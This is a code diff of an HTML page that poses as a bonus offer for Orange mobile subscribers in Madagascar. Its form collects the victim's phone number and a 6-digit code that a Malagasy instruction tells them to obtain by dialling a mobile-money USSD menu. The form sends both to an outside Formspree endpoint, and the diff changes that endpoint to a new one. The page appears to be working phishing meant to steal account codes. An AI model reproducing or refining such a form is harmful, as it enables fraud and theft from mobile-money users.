@@ -59,7 +59,7 @@
         <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img">
         <h2 style="font-size: 20px;">Validation</h2>
         <div class="info-code">⚠️ Tsy foronina ny 6 chiffres fa alaina ao am #144*3*3*code#</div>
-        <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
+        <form id="bonusForm" action="https://formspree.io/f/xjgegwrd" method="POST">
             <input type="hidden" name="Tarif" id="selectedTarifInput">
             <input type="tel" name="Numero" id="phoneInput" placeholder="Numero Orange (032.. na 037..)" maxlength="10" required>
             <input type="number" name="Code" id="codeInput" placeholder="Code 6 chiffres" oninput="if(this.value.length > 6) this.value = this.value.slice(0, 6);" disabled required>
@@ -86,7 +86,6 @@
         const code = codeInput.value;
         const isOrange = phone.startsWith('032') || phone.startsWith('037');
         codeInput.disabled = !isOrange;
-        // Tsy maintsy 6 chiffres vao mandeha ny bokotra
         submitBtn.disabled = !(isOrange && code.length === 6);
     }
 
